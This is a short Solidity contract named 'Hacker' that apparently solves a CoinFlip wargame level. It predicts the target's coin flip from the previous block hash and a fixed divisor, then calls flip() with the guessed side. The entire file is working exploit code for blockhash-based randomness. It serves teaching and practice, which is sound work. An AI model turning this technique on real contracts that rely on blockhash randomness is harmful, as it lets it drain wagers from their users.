// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Hacker {
  address public hacker;

  uint256 private lastHash;
  uint256 private FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /// @notice Simulate the target contract `flip` logic, and provide the predicted value
  /// @return The result of the one flip
  function attack(address _targetAddress) public onlyHacker returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return CoinFlip(_targetAddress).flip(side);
  }
}